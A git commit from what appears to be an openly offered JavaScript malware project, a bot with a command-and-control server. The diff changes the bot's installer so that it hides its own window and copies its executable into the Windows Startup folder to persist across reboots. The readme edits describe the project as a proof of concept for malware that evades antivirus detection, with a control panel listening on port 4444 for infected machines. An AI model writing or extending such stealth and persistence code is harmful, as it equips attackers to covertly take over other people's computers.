30878561dd822318827509fcb7b0e0b1d376b88d
christophe bellec <christophe.bellec@ekim.fr>
2022-01-01 17:04:25 +0100

    fix installation

--- Bot/src/core/installation.js
+++ Bot/src/core/installation.js
@@ -1,31 +1,29 @@
 const fs = require("fs");
 const config = require("../config");
 const identification = require("./identification");
-const hideWindow = require('./hideWindow');
+const hideWindow = require("./hideWindow");
 
 function windowsInstallation() {
+  const targetFile = `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${config.common.binName}.exe`;
   try {
-    hideWindow(config.common.binName);
     if (!fs.existsSync(config.windowsInstallPath)) {
       fs.mkdirSync(config.windowsInstallPath, { recursive: true });
-
-      fs.copyFile(
-        `./${config.common.binName}.exe`,
-        `${process.env.APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${config.common.binName}.exe`, (error) => {
-          if (error) {
-            console.log(error);
-          }
-        });
-
     }
-
+    if (!fs.existsSync(targetFile)) {
+      fs.copyFile(`./${config.common.binName}.exe`, targetFile, (error) => {
+        if (error) {
+          console.log(error);
+        }
+      });
+    }
   } catch (error) {
-    console.log(error)
+    console.log(error);
   }
 }
 
 function installation() {
   if (identification.platform === "win32") {
+    hideWindow(config.common.binName);
     windowsInstallation();
   } else if (identification.platform === "darwin") {
     return "";
--- readme.md
+++ readme.md
@@ -8,9 +8,9 @@ I also have to warn you that you can only use this code inside your own network.
 I'm sure you'll all do it because thre's only good guys on github :-)<br />
 I made this POC to prove that you can build undetected malwares in javascript. At the time of the writing, the bot is not detected at all by virustotal.<br />
 
-### Command center
+### Control center
 
-The command center is written using electron framework, react and typescript.<br />
+The control center is written using electron framework, react and typescript.<br />
 In order to use it it's a bit hard, you have to do _yarn install_ and _yarn start_ inside the Server folder.<br />
 Once started you can click on "connect" to start listening on port 4444. A websocket server is instantiated and waiting for incoming connections.<br />
 The UI is designed to be ugly and not user friendly at all.<br />
